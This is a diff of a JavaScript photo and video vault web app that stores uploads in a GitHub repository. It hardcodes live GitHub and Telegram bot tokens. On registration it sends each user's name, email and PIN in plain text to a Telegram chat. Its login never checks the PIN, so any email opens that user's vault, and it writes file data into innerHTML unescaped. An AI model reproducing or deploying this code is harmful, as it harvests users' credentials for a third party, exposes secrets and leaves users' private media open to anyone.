@@ -1,38 +1,44 @@
-let isRegistering = false;
+// Swiper Init
+new Swiper(".mySwiper", { effect: "cards", grabCursor: true, autoplay: { delay: 2500 } });
+
+// Config
 const GITHUB_TOKEN = "Ghp_QUGftteZ1wXZ9xe4Ucqpfyd0YQNxvr0N8aAj";
 const REPO_OWNER = "SIYAMBOSS";
 const REPO_NAME = "PHOTO SAVE-BOSS";
 const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
 const CHAT_ID = "7416528268";
 
+let isRegistering = false;
+let deleteItemData = null;
+
+// Session Management (Reload Solve)
+window.onload = () => {
+    const user = localStorage.getItem('activeUser');
+    if(user) showDashboard(user);
+    else document.getElementById('auth-section').classList.remove('hidden');
+};
+
 function toggleAuth() {
     isRegistering = !isRegistering;
     document.getElementById('reg-fields').classList.toggle('hidden');
-    document.getElementById('auth-title').innerText = isRegistering ? "Create Account" : "Login";
-    document.getElementById('toggle-text').innerHTML = isRegistering ? 
-        "Already have an account? <span class='text-blue-500 font-bold'>Login</span>" : 
-        "Don't have an account? <span class='text-blue-500 font-bold'>Create Account</span>";
+    document.getElementById('auth-title').innerText = isRegistering ? "CREATE" : "LOGIN";
 }
 
 async function handleAuth() {
     const name = document.getElementById('user-name').value;
     const email = document.getElementById('user-email').value;
     const pin = document.getElementById('pin-1').value;
-
     if(!email || !pin) return;
 
     if(isRegistering) {
-        if(!name) return;
-        const msg = `🌟 NEW REGISTRATION\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
+        const msg = `🌟 NEW VAULT USER\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-        alert("Registration Successful! Please Login.");
+        alert("Registration Success!");
         toggleAuth();
     } else {
-        const msg = `🔓 LOGIN ATTEMPT\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-        document.getElementById('login-sound').play();
         localStorage.setItem('activeUser', email);
         showDashboard(email);
+        document.getElementById('login-sound').play();
     }
 }
 
@@ -43,54 +49,90 @@ function showDashboard(email) {
 }
 
 function switchTab(tab) {
-    const photoTab = document.getElementById('tab-photos');
-    const albumTab = document.getElementById('tab-albums');
-    const photoContent = document.getElementById('photos-content');
-    const albumContent = document.getElementById('albums-content');
-
-    if(tab === 'photos') {
-        photoTab.className = "text-blue-500 font-bold border-b-2 border-blue-500 pb-1";
-        albumTab.className = "text-zinc-500 pb-1";
-        photoContent.classList.remove('hidden');
-        albumContent.classList.add('hidden');
-    } else {
-        albumTab.className = "text-blue-500 font-bold border-b-2 border-blue-500 pb-1";
-        photoTab.className = "text-zinc-500 pb-1";
-        albumContent.classList.remove('hidden');
-        photoContent.classList.add('hidden');
-    }
+    const tabs = ['photos', 'videos', 'albums'];
+    tabs.forEach(t => {
+        document.getElementById(`tab-${t}`).classList.remove('active');
+        document.getElementById(`${t}-content`).classList.add('hidden');
+    });
+    document.getElementById(`tab-${tab}`).classList.add('active');
+    document.getElementById(`${tab}-content`).classList.remove('hidden');
+    const email = localStorage.getItem('activeUser');
+    if(tab === 'photos') loadGallery(email);
+    if(tab === 'videos') loadVideos(email);
 }
 
-async function uploadImage(event) {
+async function uploadFile(event) {
     const file = event.target.files[0];
     const email = localStorage.getItem('activeUser');
     if(!file) return;
 
+    document.getElementById('loader').classList.remove('hidden');
     const reader = new FileReader();
-    reader.onload = async function(e) {
+    reader.onload = async (e) => {
         const content = e.target.result.split(',')[1];
-        const path = `vault/${email}/photos/${Date.now()}.png`;
-        const url = `https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`;
-
-        const res = await fetch(url, {
+        const type = file.type.startsWith('video') ? 'videos' : 'photos';
+        const path = `vault/${email}/${type}/${Date.now()}.${file.name.split('.').pop()}`;
+        
+        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`, {
             method: 'PUT',
-            headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: "HD Upload", content: content })
+            headers: { 'Authorization': `token ${GITHUB_TOKEN}` },
+            body: JSON.stringify({ message: "Upload", content: content })
         });
-        if(res.ok) loadGallery(email);
+        if(res.ok) switchTab(type === 'videos' ? 'videos' : 'photos');
+        document.getElementById('loader').classList.add('hidden');
     };
     reader.readAsDataURL(file);
 }
 
 async function loadGallery(email) {
-    const gallery = document.getElementById('photos-content');
     const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/photos`, {
         headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
     });
     if(res.ok) {
         const files = await res.json();
-        gallery.innerHTML = files.reverse().map(f => `<img src="${f.download_url}" onclick="window.open('${f.download_url}')">`).join('');
+        document.getElementById('photos-content').innerHTML = files.reverse().map(f => `
+            <div class="relative group aspect-square">
+                <img src="${f.download_url}" class="w-full h-full object-cover">
+                <button onclick="confirmDelete('${f.path}', '${f.sha}')" class="absolute top-1 right-1 bg-red-600 p-1.5 rounded text-[10px] opacity-0 group-hover:opacity-100 transition-all"><i class="fa-solid fa-trash"></i></button>
+            </div>
+        `).join('');
     }
 }
 
-function logout() { localStorage.removeItem('activeUser'); location.reload(); }
+async function loadVideos(email) {
+    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/videos`, {
+        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+    });
+    if(res.ok) {
+        const files = await res.json();
+        document.getElementById('videos-content').innerHTML = files.reverse().map(f => `
+            <div class="relative group bg-zinc-900 rounded-xl overflow-hidden">
+                <video src="${f.download_url}" controls></video>
+                <button onclick="confirmDelete('${f.path}', '${f.sha}')" class="absolute top-2 right-2 bg-red-600 p-2 rounded-lg text-xs"><i class="fa-solid fa-trash"></i></button>
+            </div>
+        `).join('');
+    }
+}
+
+function confirmDelete(path, sha) {
+    deleteItemData = { path, sha };
+    document.getElementById('delete-modal').classList.remove('hidden');
+}
+
+function closeDeleteModal() { document.getElementById('delete-modal').classList.add('hidden'); }
+
+document.getElementById('confirm-delete-btn').onclick = async () => {
+    const { path, sha } = deleteItemData;
+    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`, {
+        method: 'DELETE',
+        headers: { 'Authorization': `token ${GITHUB_TOKEN}` },
+        body: JSON.stringify({ message: "Delete", sha: sha })
+    });
+    if(res.ok) {
+        closeDeleteModal();
+        const type = path.includes('videos') ? 'videos' : 'photos';
+        switchTab(type);
+    }
+};
+
+function logout() { localStorage.clear(); location.reload(); }
